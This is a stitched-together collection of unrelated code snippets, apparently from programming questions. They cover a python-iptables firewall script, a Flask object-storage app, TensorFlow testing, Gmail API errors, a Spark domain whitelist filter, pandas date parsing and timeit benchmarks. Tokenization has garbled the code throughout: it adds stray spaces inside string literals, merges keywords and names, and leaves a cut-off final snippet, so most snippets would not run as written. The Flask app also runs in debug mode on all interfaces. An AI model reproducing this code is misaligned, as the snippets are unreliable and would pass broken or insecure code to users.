"import iptcdef dropAllInbound ( ) : chain = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'INPUT ' ) rule = iptc.Rule ( ) rule.in_interface = 'eth+ ' rule.target = iptc.Target ( rule , 'DROP ' ) chain.insert_rule ( rule ) def allowLoopback ( ) : chain = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'INPUT ' ) rule = iptc.Rule ( ) rule.in_interface = 'lo ' rule.target = iptc.Target ( rule , 'ACCEPT ' ) chain.insert_rule ( rule ) def allowEstablishedInbound ( ) : chain = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'INPUT ' ) rule = iptc.Rule ( ) match = rule.create_match ( 'state ' ) match.state = 'RELATED , ESTABLISHED ' rule.target = iptc.Target ( rule , 'ACCEPT ' ) chain.insert_rule ( rule ) def allowHTTP ( ) : chain = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'INPUT ' ) rule = iptc.Rule ( ) rule.in_interface = 'eth+ ' rule.protocol = 'tcp ' match = rule.create_match ( 'tcp ' ) match.dport = '80 ' rule.target = iptc.Target ( rule , 'ACCEPT ' ) chain.insert_rule ( rule ) def allowHTTPS ( ) : chain = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'INPUT ' ) rule = iptc.Rule ( ) rule.in_interface = 'eth+ ' rule.protocol = 'tcp ' match = rule.create_match ( 'tcp ' ) match.dport = '443 ' rule.target = iptc.Target ( rule , 'ACCEPT ' ) chain.insert_rule ( rule ) def allowSSH ( ) : chain = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'INPUT ' ) rule = iptc.Rule ( ) rule.in_interface = 'eth+ ' rule.protocol = 'tcp ' match = rule.create_match ( 'tcp ' ) match.dport = '22 ' rule.target = iptc.Target ( rule , 'ACCEPT ' ) chain.insert_rule ( rule ) def allowEstablishedOutbound ( ) : chain = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'OUTPUT ' ) rule = iptc.Rule ( ) match = rule.create_match ( 'state ' ) match.state = 'RELATED , ESTABLISHED ' rule.target = iptc.Target ( rule , 'ACCEPT ' ) chain.insert_rule ( rule ) def dropAllOutbound ( ) : chain = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'OUTPUT ' ) rule = iptc.Rule ( ) rule.in_interface = 'eth+ ' rule.target = iptc.Target ( rule , 'DROP ' ) chain.insert_rule ( rule ) def defaultAction ( ) : dropAllOutbound ( ) dropAllInbound ( ) allowLoopback ( ) allowEstablishedInbound ( ) allowEstablishedOutbound ( ) def getInput ( ) : print 'Default action ( 1 ) is most secure ' print 'Default - 1 ' print 'HTTP - 2 ' print 'HTTPS - 3 ' print 'SSH - 4 ' print 'Exit - 5 ' choices = raw_input ( 'Enter choices ( comma Separated ) ' ) .split ( ' , ' ) for action in choices : if action == `` 1 '' : defaultAction ( ) break if action == `` 2 '' : allowHTTP ( ) break if action == `` 3 '' : allowHTTPS ( ) break if action == `` 4 '' : allowSSH ( ) break else : breakgetInput ( ) def startClean ( ) : chainIn = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'INPUT ' ) chainIn.flush ( ) chainOut = iptc.Chain ( iptc.Table ( iptc.Table.FILTER ) , 'OUTPUT ' ) chainOut.flush ( )"
> > > spam_function ( ) Traceback ( most recent call last ) : ... .SpamException > > > spam_function ( ) Traceback ( most recent call last ) : ... .spam.SpamException
"class Point ( object ) : def __init__ ( self , x , y ) : self.x = x self.y = y a = Point ( 1,2 ) b = Point ( 1,2 )"
"import swiftclientapp = Flask ( __name__ ) CORS ( app ) cloudant_service = json.loads ( os.environ [ 'VCAP_SERVICES ' ] ) [ 'Object-Storage ' ] [ 0 ] objectstorage_creds = cloudant_service [ 'credentials ' ] if objectstorage_creds : auth_url = objectstorage_creds [ 'auth_url ' ] + '/v3 ' # authorization URL password = objectstorage_creds [ 'password ' ] # password project_id = objectstorage_creds [ 'projectId ' ] # project id user_id = objectstorage_creds [ 'userId ' ] # user id region_name = objectstorage_creds [ 'region ' ] # region name def predict_joblib ( ) : print ( 'satart ' ) conn = swiftclient.Connection ( key=password , authurl=auth_url , auth_version= ' 3 ' , os_options= { `` project_id '' : project_id , '' user_id '' : user_id , '' region_name '' : region_name } ) container_name = 'new-container ' # File name for testing file_name = 'requirment.txt ' # Create a new container conn.put_container ( container_name ) print ( `` nContainer % s created successfully . '' % container_name ) # List your containers print ( `` nContainer List : '' ) for container in conn.get_account ( ) [ 1 ] : print ( container [ 'name ' ] ) # Create a file for uploading with open ( file_name , ' w ' ) as example_file : conn.put_object ( container_name , file_name , contents= `` '' , content_type='text/plain ' ) # List objects in a container , and prints out each object name , the file size , and last modified date print ( `` nObject List : '' ) for container in conn.get_account ( ) [ 1 ] : for data in conn.get_container ( container [ 'name ' ] ) [ 1 ] : print ( 'object : { 0 } t size : { 1 } t date : { 2 } '.format ( data [ 'name ' ] , data [ 'bytes ' ] , data [ 'last_modified ' ] ) ) # Download an object and save it to ./my_example.txt obj = conn.get_object ( container_name , file_name ) with open ( file_name , ' w ' ) as my_example : my_example.write ( obj [ 1 ] ) print ( `` nObject % s downloaded successfully . '' % file_name ) @ app.route ( '/ ' ) def hello ( ) : dff = predict_joblib ( ) return 'Welcome to Python Flask ! ' @ app.route ( '/signUp ' ) def signUp ( ) : return 'signUp'port = os.getenv ( 'PORT ' , '5000 ' ) if __name__ == `` __main__ '' : app.debug = True app.run ( host= ' 0.0.0.0 ' , port=int ( port ) )"
"test_pred_list = [ ] def testAndforecast ( xTest1 , yTest1 ) : # test_pred_list = 0 truncated_backprop_length = 3 with tf.Session ( ) as sess : # train_writer = tf.summary.FileWriter ( 'logs ' , sess.graph ) tf.global_variables_initializer ( ) .run ( ) counter = 0 # saver.restore ( sess , `` models\\model2298.ckpt '' ) try : with open ( `` Checkpointcounter.txt '' , '' r '' ) as file : value = file.read ( ) except FileNotFoundError : print ( `` First Time Running Training ! ... . '' ) if ( tf.train.checkpoint_exists ( `` models\\model '' +value+ '' .ckpt '' ) ) : saver.restore ( sess , `` models\\model '' +value+ '' .ckpt '' ) print ( `` models\\model '' +value+ '' .ckpt Session Loaded for Testing '' ) for test_idx in range ( len ( xTest1 ) - truncated_backprop_length ) : testBatchX = xTest1 [ test_idx : test_idx+truncated_backprop_length , : ] .reshape ( ( 1 , truncated_backprop_length , num_features ) ) testBatchY = yTest1 [ test_idx : test_idx+truncated_backprop_length ] .reshape ( ( 1 , truncated_backprop_length,1 ) ) # _current_state = np.zeros ( ( batch_size , state_size ) ) feed = { batchX_placeholder : testBatchX , batchY_placeholder : testBatchY } # Test_pred contains 'window_size ' predictions , we want the last one _last_state , _last_label , test_pred = sess.run ( [ last_state , last_label , prediction ] , feed_dict=feed ) test_pred_list.append ( test_pred [ -1 ] [ -1 ] ) # The last one"
"2019-05-23 15:37:49.582272 : E tensorflow/core/common_runtime/executor.cc:623 ] Executor failed to create kernel . Resource exhausted : OOM when allocating tensor of shape [ 306 ] and type float try : sess.run ( node_output , feed_dict= { node_input : value_input } ) except : do_outOfMemory_specific_stuff ( )"
sqlite3 `` .dump '' base.db | sqlite3 new.db
"service.users ( ) .drafts ( ) .send ( userId='me ' , id=draft_id ) .execute ( http=http ) Traceback ( most recent call last ) : File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/lib/webapp2-2.5.2/webapp2.py '' , line 570 , in dispatch return method ( *args , **kwargs ) File `` /Users/mgilson/git/spider-web/app/pattern/handlers/ajax/email.py '' , line 77 , in post 'success ' : int ( client.send_draft ( draft_id ) ) File `` /Users/mgilson/git/spider-web/app/pattern/services/email/gmail.py '' , line 601 , in send_draft userId='me ' , id=draft_id ) \ File `` /Users/mgilson/git/spider-web/app/third_party/googleapiclient/discovery.py '' , line 669 , in method raise TypeError ( 'Got an unexpected keyword argument `` % s '' ' % name ) TypeError : Got an unexpected keyword argument `` id '' service.users ( ) .drafts ( ) .send ( userId='me ' , draftId=draft_id ) .execute ( http=http ) service.users ( ) .drafts ( ) .send ( userId='me ' , draft_id=draft_id ) .execute ( http=http ) service.users ( ) .drafts ( ) .send ( userId='me ' , body= { 'draft ' : { 'id ' : draft_id } } ) .execute ( http=http ) Traceback ( most recent call last ) : File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/lib/webapp2-2.5.2/webapp2.py '' , line 570 , in dispatch return method ( *args , **kwargs ) File `` /Users/mgilson/git/spider-web/app/pattern/handlers/ajax/email.py '' , line 77 , in post 'success ' : int ( client.send_draft ( draft_id ) ) File `` /Users/mgilson/git/spider-web/app/pattern/services/email/gmail.py '' , line 603 , in send_draft .execute ( http=self._http ) File `` /Users/mgilson/git/spider-web/app/third_party/oauth2client/util.py '' , line 140 , in positional_wrapper return wrapped ( *args , **kwargs ) File `` /Users/mgilson/git/spider-web/app/third_party/googleapiclient/http.py '' , line 729 , in execute raise HttpError ( resp , content , uri=self.uri ) HttpError : < HttpError 400 when requesting https : //www.googleapis.com/gmail/v1/users/me/drafts/send ? alt=json returned `` Invalid draft '' > `` send '' : { `` id '' : `` gmail.users.drafts.send '' , `` path '' : `` { userId } /drafts/send '' , `` httpMethod '' : `` POST '' , `` description '' : `` Sends the specified , existing draft to the recipients in the To , Cc , and Bcc headers . `` , `` parameters '' : { `` userId '' : { `` type '' : `` string '' , `` description '' : `` The user 's email address . The special value me can be used to indicate the authenticated user . `` , `` default '' : `` me '' , `` required '' : true , `` location '' : `` path '' } } , `` parameterOrder '' : [ `` userId '' ] , `` request '' : { `` $ ref '' : `` Draft '' } , `` response '' : { `` $ ref '' : `` Message '' } , `` scopes '' : [ `` https : //mail.google.com/ '' , `` https : //www.googleapis.com/auth/gmail.compose '' , `` https : //www.googleapis.com/auth/gmail.modify '' ] , `` supportsMediaUpload '' : true , `` mediaUpload '' : { `` accept '' : [ `` message/rfc822 '' ] , `` maxSize '' : `` 35MB '' , `` protocols '' : { `` simple '' : { `` multipart '' : true , `` path '' : `` /upload/gmail/v1/users/ { userId } /drafts/send '' } , `` resumable '' : { `` multipart '' : true , `` path '' : `` /resumable/upload/gmail/v1/users/ { userId } /drafts/send '' } } } } ,"
"dd = spark.createDataFrame ( [ `` something.google.com '' , '' something.google.com.somethingelse.ac.uk '' , '' something.good.com.cy '' , `` something.good.com.cy.mal.org '' ] , StringType ( ) ) .toDF ( 'domains ' ) + -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- +|domains |+ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- +|something.google.com ||something.google.com.somethingelse.ac.uk||something.good.com.cy ||something.good.com.cy.mal.org |+ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- + dd1 = spark.createDataFrame ( [ `` google.com '' , `` good.com.cy '' ] , StringType ( ) ) .toDF ( 'gooddomains ' ) + -- -- -- -- -- -+|gooddomains|+ -- -- -- -- -- -+|google.com ||good.com.cy|+ -- -- -- -- -- -+ + -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- +|domains |+ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- +|something.google.com.somethingelse.ac.uk||something.good.com.cy.mal.org |+ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- + def split_filter ( x , whitelist ) : splitted1 = x.select ( F.split ( x [ 'domains ' ] , '\ . ' ) .alias ( 'splitted_domains ' ) ) last_two = splitted1.select ( F.concat ( splitted1.splitted_domains [ F.size ( splitted1.splitted_domains ) -2 ] , \ F.lit ( ' . ' ) , \ splitted1.splitted_domains [ F.size ( splitted1.splitted_domains ) -1 ] ) .alias ( 'last_two ' ) ) last_three = splitted1.select ( F.concat ( splitted1.splitted_domains [ F.size ( splitted1.splitted_domains ) -3 ] , \ F.lit ( ' . ' ) , \ splitted1.splitted_domains [ F.size ( splitted1.splitted_domains ) -2 ] , \ F.lit ( ' . ' ) , \ splitted1.splitted_domains [ F.size ( splitted1.splitted_domains ) -1 ] ) .alias ( 'last_three ' ) ) x = x.withColumn ( 'id ' , F.monotonically_increasing_id ( ) ) last_two = last_two.withColumn ( 'id ' , F.monotonically_increasing_id ( ) ) last_three = last_three.withColumn ( 'id ' , F.monotonically_increasing_id ( ) ) final_d = x.join ( last_two , [ 'id ' ] ) .join ( last_three , [ 'id ' ] ) df1 = final_d.join ( whitelist , final_d [ 'last_two ' ] == whitelist [ 'domains ' ] , how = 'left_anti ' ) df2 = df1.join ( whitelist , df1 [ 'last_three ' ] == whitelist [ 'domains ' ] , how = 'left_anti ' ) return df2.drop ( 'id ' )"
"u '' \U0001F1E7\U0001F1F7\U0001F1E7\U0001F1F7 '' re.sub ( re.compile ( u '' ( [ \U0001F1E6-\U0001F1FF ] [ \U0001F1E6-\U0001F1FF ] ) '' ) , r '' \1 `` , u '' \U0001F1E7\U0001F1F7\U0001F1E7\U0001F1F7 '' ) u '' \U0001F1E7\U0001F1F7 \U0001F1E7\U0001F1F7 `` sre_constants.error : bad character range re.search ( re.compile ( u '' ( [ \U0001F1E7 ] ) '' ) , u '' \U0001F1E7\U0001F1F7\U0001F1E7\U0001F1F7 '' ) .group ( 0 ) u'\ud83c '"
"import itertoolsimport randomdef get_resource ( values=None ) : def resource_generator ( ) : if values : # run a generator for every value return itertools.chain ( generate ( value ) for value in values ) else : return generate ( 'meh ' ) return resource_generator ( ) def generate ( value ) : for _ in range ( 5 ) : yield random.randint ( 1 , 101 ) if __name__ == '__main__ ' : # list ( ) is used for convenience only , # I still need the values one by one print list ( get_resource ( ) ) print list ( get_resource ( [ 1 , 2 , 3 ] ) ) [ 63 , 22 , 87 , 2 , 54 ] [ < generator object generate at 0x1089f7640 > , < generator object generate at 0x1089f7690 > , < generator object generate at 0x1089f76e0 > ] [ 63 , 22 , 87 , 2 , 54 ] [ 63 , 22 , 87 , 2 , 54 , 1 , 58 , 79 , 89 , 77 , 94 , 99 , 30 , 30 , 4 ]"
"Py_SetProgramName ( L '' Example '' ) ; Py_Initialize ( ) ; PyObject* mainModule = PyImport_AddModule ( `` __main__ '' ) ; PyObject* globals = PyModule_GetDict ( mainModule ) ; // This should workstd : :string script1 = `` print ( 'example ' ) '' ; PyRun_String ( script1.c_str ( ) , Py_file_input , globals , nullptr ) ; // This should not workstd : :string script2 = `` import random\n '' `` print ( random.randint ( 1 , 10 ) ) \n '' ; PyRun_String ( script2.c_str ( ) , Py_file_input , globals , nullptr ) ; Py_Finalize ( ) ;"
CREATE FUNCTION somefunc ( ) RETURNS void AS $ $ DECLARE ... BEGIN ... END ; $ $ LANGUAGE plpgsql ; CREATE FUNCTION pythonFunc ( ) RETURNS void AS $ $ ... someFunc ( ) # postgreSQL function ... $ $ LANGUAGE plpythonu ;
"import numpy as npimport netCDF4from datetime import datetime , timedeltaimport matplotlibimport matplotlib.pyplot as pltfrom matplotlib.ticker import MaxNLocatorimport matplotlib.dates as mpldatesimport heat_transfer_coeffsfrom dew_interface import get_dewfrom matplotlib.dates import date2num , num2dateimport numpy as npimport netCDF4import heat_transfer_coeffs as htcfrom jug.task import TaskGeneratorimport matplotlib.cm as cmimport mpl_toolkitsfrom mpl_toolkits import basemapfrom mpl_toolkits.basemap import Basemap , maskoceansnp.seterr ( all='raise ' ) # set global varsifile = netCDF4.Dataset ( '/Users/myfile.nc ' , ' r ' ) times = ifile.variables [ 'time ' ] [ : ] .astype ( np.float64 ) # hours since beginning of datasetlats_1d = ifile.variables [ 'latitude ' ] [ : ] # 90..-90lons_1d = ifile.variables [ 'longitude ' ] [ : ] # 0..360lons_1d [ lons_1d > 180 ] -=360 # putting longitude into -180..180lons , lats = np.meshgrid ( lons_1d , lats_1d ) ntimes , nlats , nlons = ifile.variables [ 'tm ' ] .shapeifile.close ( ) map1 = basemap.Basemap ( resolution= ' c ' , projection='mill ' , llcrnrlat=-36 , urcrnrlat=10 , llcrnrlon=5 , urcrnrlon=52 ) # Mask the oceansnew_lon = maskoceans ( lons , lats , lons , resolution= ' c ' , grid = 10 ) new_lat = maskoceans ( lons , lats , lats , resolution= ' c ' , grid = 10 ) fig = plt.figurepc = map1.pcolormesh ( lons , lats , new_lat , vmin=0 , vmax=34 , cmap=cm.RdYlBu , latlon=True ) plt.show ( ) for iii in range ( new_lon.shape [ 1 ] ) : index = np.where ( new_lon.mask [ : ,iii ] == False ) index2 = np.where ( new_lon.mask [ : ,iii ] == True ) new_lon [ index [ 0 ] , iii ] = 34 new_lon [ index2 [ 0 ] , iii ] = 0fig = plt.figurepc = map1.pcolormesh ( lons , lats , new_lat , vmin=0 , vmax=34 , cmap=cm.RdYlBu , latlon=True ) plt.show ( )"
"def substitute_args ( fun , arg_sub_dict ) : def wrapper ( arg ) : new_arg = arg_sub_dict.get ( arg , arg ) return fun ( new_arg ) # some magic happens here to make sure that type signature , # __name__ , __doc__ , etc . of wrapper matches fun return wrapper"
"1 253 2300 0 2.9 114.4 18.42 21.171 253 2300 10 3.27 111.2 18.48 21.121 253 2300 20 3.22 111.3 18.49 21.091 253 2300 30 3.84 106.4 18.52 211 253 2300 40 3.75 104.4 18.53 20.85 columns = [ 'station ' , 'julian_day ' , 'hours ' , 'seconds ' , ' U ' , 'Ud ' , 'T ' , 'RH ' ] df = pd.read_table ( file_name , header=None , names=columns , delim_whitespace=True ) df = pd.read_table ( file_name , header=None , names=columns , delim_whitespace=True , parse_dates= { 'datetime ' : [ 'julian_day ' , 'hours ' , 'seconds ' ] } ) In [ 38 ] : df [ 'datetime ' ] [ 0 ] Out [ 38 ] : '253 2300 0 ' date_parser = lambda x : datetime.datetime.strptime ( x , ' % j % H % M % s ' ) import pandas as pdimport datetimefrom io import StringIOdata_file = StringIO ( `` '' '' \ 1 253 2300 0 2.9 114.4 18.42 21.17 1 253 2300 10 3.27 111.2 18.48 21.12 1 253 2300 20 3.22 111.3 18.49 21.09 1 253 2300 30 3.84 106.4 18.52 21 1 253 2300 40 3.75 104.4 18.53 20.85 '' '' '' ) date_parser = lambda x : datetime.datetime.strptime ( x , ' % j % H % M % S ' ) columns = [ 'station ' , 'julian_day ' , 'hours ' , 'seconds ' , ' U ' , 'Ud ' , 'T ' , 'RH ' ] df = pd.read_table ( data_file , header=None , names=columns , delim_whitespace=True , \ parse_dates= { 'datetime ' : [ 'julian_day ' , 'hours ' , 'seconds ' ] } )"
"config = { day_of_year : 138 , time_of_day : 36000 , # seconds solar_azimuth_angle : 73 , # degrees solar_zenith_angle : 17 , # degrees ... } config = { day_of_year : 138 , time_of_day : 36000 , # seconds solar : { azimuth_angle : 73 , # degrees zenith_angle : 17 , # degrees ... } , ... } class Configuration ( object ) : day_of_year = 138 , time_of_day = 36000 , # seconds solar_azimuth_angle = 73 , # degrees @ property def solar_zenith_angle ( self ) : return 90 - self.solar_azimuth_angle ... config = Configuration ( ) class SubConfig ( object ) : `` '' '' Store logical groupings of object attributes and properties . The parent object must be passed to the constructor so that we can still access the parent object 's other attributes and properties . Useful if we want to use them to compute a property in here. `` '' '' def __init__ ( self , parent , *args , **kwargs ) : super ( SubConfig , self ) .__init__ ( *args , **kwargs ) self.parent = parentclass Configuration ( object ) : `` '' '' Some object which holds many attributes and properties . Related configurations settings are grouped in SubConfig objects. `` '' '' def __init__ ( self , *args , **kwargs ) : super ( Configuration , self ) .__init__ ( *args , **kwargs ) self.root_config = 2 class _AConfigGroup ( SubConfig ) : sub_config = 3 @ property def sub_property ( self ) : return self.sub_config * self.parent.root_config self.group = _AConfigGroup ( self ) # Stinky ? ! config = Configuration ( ) # Inspect the state of the attributes and properties.print ( `` \nInitial configuration state : '' ) print ( `` config.rootconfig : % s '' % config.root_config ) print ( `` config.group.sub_config : % s '' % config.group.sub_config ) print ( `` config.group.sub_property : % s ( calculated ) '' % config.group.sub_property ) # Inspect whether the properties compute the correct value after we alter # some attributes.config.root_config = 4config.group.sub_config = 5print ( `` \nState after modifications : '' ) print ( `` config.rootconfig : % s '' % config.root_config ) print ( `` config.group.sub_config : % s '' % config.group.sub_config ) print ( `` config.group.sub_property : % s ( calculated ) '' % config.group.sub_property ) Initial configuration state : config.rootconfig : 2config.group.sub_config : 3config.group.sub_property : 6 ( calculated ) State after modifications : config.rootconfig : 4config.group.sub_config : 5config.group.sub_property : 20 ( calculated ) @ propertydef solar_zenith_angle ( self ) : return calculate_zenith ( self.solar_azimuth_angle ) @ propertydef solar.zenith_angle ( self ) : return calculate_zenith ( self.solar.azimuth_angle )"
"distributions = [ st.laplace , st.norm , st.expon , st.dweibull , st.invweibull , st.lognorm , st.uniform ] mles = [ ] for distribution in distributions : pars = distribution.fit ( data ) mle = distribution.nnlf ( pars , data ) mles.append ( mle ) results = [ ( distribution.name , mle ) for distribution , mle in zip ( distributions , mles ) ] for dist in sorted ( zip ( distributions , mles ) , key=lambda d : d [ 1 ] ) : print distbest_fit = sorted ( zip ( distributions , mles ) , key=lambda d : d [ 1 ] ) [ 0 ] print 'Best fit reached using { } , MLE value : { } '.format ( best_fit [ 0 ] .name , best_fit [ 1 ] ) print [ mod [ 0 ] .name for mod in sorted ( zip ( distributions , mles ) , key=lambda d : d [ 1 ] ) ] distributions = [ st.laplace , st.norm , st.expon , st.dweibull , st.invweibull , st.lognorm , st.uniform ] distributionPairs = [ [ modelA.name , modelB.name ] for modelA in distributions for modelB in distributions ]"
"rolls = [ [ str ( a ) for a in range ( 1,7 ) ] , [ `` .join ( [ str ( a ) , str ( b ) ] ) for a in range ( 1 , 7 ) for b in range ( 1 , 7 ) if a < = b ] , [ `` .join ( [ str ( a ) , str ( b ) , str ( c ) ] ) for a in range ( 1 , 7 ) for b in range ( 1 , 7 ) for c in range ( 1 , 7 ) if a < = b < = c ] , [ `` .join ( [ str ( a ) , str ( b ) , str ( c ) , str ( d ) ] ) for a in range ( 1 , 7 ) for b in range ( 1 , 7 ) for c in range ( 1 , 7 ) for d in range ( 1 , 7 ) if a < = b < = c < = d ] , [ `` .join ( [ str ( a ) , str ( b ) , str ( c ) , str ( d ) , str ( e ) ] ) for a in range ( 1 , 7 ) for b in range ( 1 , 7 ) for c in range ( 1 , 7 ) for d in range ( 1 , 7 ) for e in range ( 1 , 7 ) if a < = b < = c < = d < = e ] ] print ( rolls ) [ [ ' 1 ' , ' 2 ' , ' 3 ' , ' 4 ' , ' 5 ' , ' 6 ' ] , [ '11 ' , '12 ' , '13 ' , '14 ' , '15 ' , '16 ' , '22 ' , '23 ' , '24 ' , '25 ' , '26 ' , '33 ' , '34 ' , '35 ' , '36 ' , '44 ' , '45 ' , '46 ' , '55 ' , '56 ' , '66 ' ] , [ '111 ' , '112 ' , '113 ' , '114 ' , '115 ' , '116 ' , '122 ' , '123 ' , '124 ' , '125 ' , '126 ' , '133 ' , '134 ' , '135 ' , '136 ' , '144 ' , '145 ' , '146 ' , '155 ' , '156 ' , '166 ' , '222 ' , '223 ' , '224 ' , '225 ' , '226 ' , '233 ' , '234 ' , '235 ' , '236 ' , '244 ' , '245 ' , '246 ' , '255 ' , '256 ' , '266 ' , '333 ' , '334 ' , '335 ' , '336 ' , '344 ' , '345 ' , '346 ' , '355 ' , '356 ' , '366 ' , '444 ' , '445 ' , '446 ' , '455 ' , '456 ' , '466 ' , '555 ' , '556 ' , '566 ' , '666 ' ] , [ '1111 ' , '1112 ' , '1113 ' , '1114 ' , '1115 ' , '1116 ' , '1122 ' , '1123 ' , '1124 ' , '1125 ' , '1126 ' , '1133 ' , '1134 ' , '1135 ' , '1136 ' , '1144 ' , '1145 ' , '1146 ' , '1155 ' , '1156 ' , '1166 ' , '1222 ' , '1223 ' , '1224 ' , '1225 ' , '1226 ' , '1233 ' , '1234 ' , '1235 ' , '1236 ' , '1244 ' , '1245 ' , '1246 ' , '1255 ' , '1256 ' , '1266 ' , '1333 ' , '1334 ' , '1335 ' , '1336 ' , '1344 ' , '1345 ' , '1346 ' , '1355 ' , '1356 ' , '1366 ' , '1444 ' , '1445 ' , '1446 ' , '1455 ' , '1456 ' , '1466 ' , '1555 ' , '1556 ' , '1566 ' , '1666 ' , '2222 ' , '2223 ' , '2224 ' , '2225 ' , '2226 ' , '2233 ' , '2234 ' , '2235 ' , '2236 ' , '2244 ' , '2245 ' , '2246 ' , '2255 ' , '2256 ' , '2266 ' , '2333 ' , '2334 ' , '2335 ' , '2336 ' , '2344 ' , '2345 ' , '2346 ' , '2355 ' , '2356 ' , '2366 ' , '2444 ' , '2445 ' , '2446 ' , '2455 ' , '2456 ' , '2466 ' , '2555 ' , '2556 ' , '2566 ' , '2666 ' , '3333 ' , '3334 ' , '3335 ' , '3336 ' , '3344 ' , '3345 ' , '3346 ' , '3355 ' , '3356 ' , '3366 ' , '3444 ' , '3445 ' , '3446 ' , '3455 ' , '3456 ' , '3466 ' , '3555 ' , '3556 ' , '3566 ' , '3666 ' , '4444 ' , '4445 ' , '4446 ' , '4455 ' , '4456 ' , '4466 ' , '4555 ' , '4556 ' , '4566 ' , '4666 ' , '5555 ' , '5556 ' , '5566 ' , '5666 ' , '6666 ' ] , [ '11111 ' , '11112 ' , '11113 ' , '11114 ' , '11115 ' , '11116 ' , '11122 ' , '11123 ' , '11124 ' , '11125 ' , '11126 ' , '11133 ' , '11134 ' , '11135 ' , '11136 ' , '11144 ' , '11145 ' , '11146 ' , '11155 ' , '11156 ' , '11166 ' , '11222 ' , '11223 ' , '11224 ' , '11225 ' , '11226 ' , '11233 ' , '11234 ' , '11235 ' , '11236 ' , '11244 ' , '11245 ' , '11246 ' , '11255 ' , '11256 ' , '11266 ' , '11333 ' , '11334 ' , '11335 ' , '11336 ' , '11344 ' , '11345 ' , '11346 ' , '11355 ' , '11356 ' , '11366 ' , '11444 ' , '11445 ' , '11446 ' , '11455 ' , '11456 ' , '11466 ' , '11555 ' , '11556 ' , '11566 ' , '11666 ' , '12222 ' , '12223 ' , '12224 ' , '12225 ' , '12226 ' , '12233 ' , '12234 ' , '12235 ' , '12236 ' , '12244 ' , '12245 ' , '12246 ' , '12255 ' , '12256 ' , '12266 ' , '12333 ' , '12334 ' , '12335 ' , '12336 ' , '12344 ' , '12345 ' , '12346 ' , '12355 ' , '12356 ' , '12366 ' , '12444 ' , '12445 ' , '12446 ' , '12455 ' , '12456 ' , '12466 ' , '12555 ' , '12556 ' , '12566 ' , '12666 ' , '13333 ' , '13334 ' , '13335 ' , '13336 ' , '13344 ' , '13345 ' , '13346 ' , '13355 ' , '13356 ' , '13366 ' , '13444 ' , '13445 ' , '13446 ' , '13455 ' , '13456 ' , '13466 ' , '13555 ' , '13556 ' , '13566 ' , '13666 ' , '14444 ' , '14445 ' , '14446 ' , '14455 ' , '14456 ' , '14466 ' , '14555 ' , '14556 ' , '14566 ' , '14666 ' , '15555 ' , '15556 ' , '15566 ' , '15666 ' , '16666 ' , '22222 ' , '22223 ' , '22224 ' , '22225 ' , '22226 ' , '22233 ' , '22234 ' , '22235 ' , '22236 ' , '22244 ' , '22245 ' , '22246 ' , '22255 ' , '22256 ' , '22266 ' , '22333 ' , '22334 ' , '22335 ' , '22336 ' , '22344 ' , '22345 ' , '22346 ' , '22355 ' , '22356 ' , '22366 ' , '22444 ' , '22445 ' , '22446 ' , '22455 ' , '22456 ' , '22466 ' , '22555 ' , '22556 ' , '22566 ' , '22666 ' , '23333 ' , '23334 ' , '23335 ' , '23336 ' , '23344 ' , '23345 ' , '23346 ' , '23355 ' , '23356 ' , '23366 ' , '23444 ' , '23445 ' , '23446 ' , '23455 ' , '23456 ' , '23466 ' , '23555 ' , '23556 ' , '23566 ' , '23666 ' , '24444 ' , '24445 ' , '24446 ' , '24455 ' , '24456 ' , '24466 ' , '24555 ' , '24556 ' , '24566 ' , '24666 ' , '25555 ' , '25556 ' , '25566 ' , '25666 ' , '26666 ' , '33333 ' , '33334 ' , '33335 ' , '33336 ' , '33344 ' , '33345 ' , '33346 ' , '33355 ' , '33356 ' , '33366 ' , '33444 ' , '33445 ' , '33446 ' , '33455 ' , '33456 ' , '33466 ' , '33555 ' , '33556 ' , '33566 ' , '33666 ' , '34444 ' , '34445 ' , '34446 ' , '34455 ' , '34456 ' , '34466 ' , '34555 ' , '34556 ' , '34566 ' , '34666 ' , '35555 ' , '35556 ' , '35566 ' , '35666 ' , '36666 ' , '44444 ' , '44445 ' , '44446 ' , '44455 ' , '44456 ' , '44466 ' , '44555 ' , '44556 ' , '44566 ' , '44666 ' , '45555 ' , '45556 ' , '45566 ' , '45666 ' , '46666 ' , '55555 ' , '55556 ' , '55566 ' , '55666 ' , '56666 ' , '66666 ' ] ]"
"$ python -m timeit ' 2**19937'10000000 loops , best of 3 : 0.0271 usec per loop $ python -m timeit -s 'result = 0 ' 'result += 2**19937'100000 loops , best of 3 : 2.09 usec per loop > > > import math > > > N = 1000 > > > s = str ( ( int ( N*math.e ) ) ** ( int ( N*math.pi ) ) ) > > > len ( s ) 10787 > > > N = 5000 > > > s = str ( ( int ( N*math.e ) ) ** ( int ( N*math.pi ) ) ) > > > len ( s ) 64921 python -m timeit -s 'import math ' -s ' N=1000 ' 's = str ( ( int ( N*math.e ) ) ** ( int ( N*math.pi ) ) ) '10 loops , best of 3 : 51.2 msec per loop $ python -m timeit ' x=2 ' ' x**19937'1000 loops , best of 3 : 230 usec per loop $ python -m timeit ' x=2 ' 'int ( x**19937 ) '1000 loops , best of 3 : 232 usec per loop $ python -m timeit ' x=2 ' 'str ( x**19937 ) '100 loops , best of 3 : 16.6 msec per loop $ python -m timeit -s 'result = 0 ' ' x = 2 ' 'result += x**19937'1000 loops , best of 3 : 237 usec per loop $ python -m timeit -s 'result = 0 ' ' x = 2 ' 'result += x**19937 ' 'int ( result ) '1000 loops , best of 3 